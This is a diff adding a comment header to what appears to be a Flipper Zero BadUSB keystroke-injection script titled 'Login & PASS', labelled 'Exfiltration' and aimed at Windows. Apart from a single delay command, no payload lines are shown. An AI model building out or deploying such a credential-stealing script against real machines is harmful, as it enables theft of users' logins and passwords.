@@ -1,3 +1,16 @@
+REM ####################################################
+REM #                                                  |
+REM # Title        : BADUSBFlipp3rs - Login & PASS     |
+REM # Author       : BULLI77                           |
+REM # Version      : 1.0                               |
+REM # Category     : Exfiltration                      |
+REM # Target       : Windows                           |
+REM #                                                  |
+REM ####################################################
+
+
+
+
 # Set the delay between each action
 DELAY 1000
 
